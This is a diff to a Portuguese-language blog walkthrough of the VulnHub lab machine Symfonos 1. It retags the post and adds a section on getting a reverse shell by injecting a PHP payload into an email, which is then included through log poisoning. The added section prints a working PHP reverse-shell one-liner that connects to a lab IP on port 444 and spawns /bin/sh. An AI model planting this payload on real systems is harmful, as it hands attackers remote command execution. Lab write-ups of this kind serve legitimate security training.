@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Symfonos 1"
-tags: [Windows,Easy]
+tags: [Linux,Easy,SMTP Poisoning,Log Poison,Wordpress,Gobuster,LFI,Smbclient,Path]
 categories: VulnHub
 ---
 
@@ -243,3 +243,21 @@ Agora é só correr pro abraço!
 # Algo a mais
 
 Tem algumas coisa que seria interessante a gente explorar aqui. Aquele wordpress pra enumerar a vulnerabilidade realmente não encontrei outro modo a não ser copiar e colar do outro blog.
+
+## Outro modo de Reverse Shell
+
+Outro modo, não sei se mais interessante de se garantir um reverse shell é inserir diretamente o reverse no email
+
+```php
+<?php $sock=fsockopen("192.168.56.102",444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/reverse.png)
+
+Atualizamos
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/reverse1.png)
+
+Recebemos o shell!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/reverse2.png)
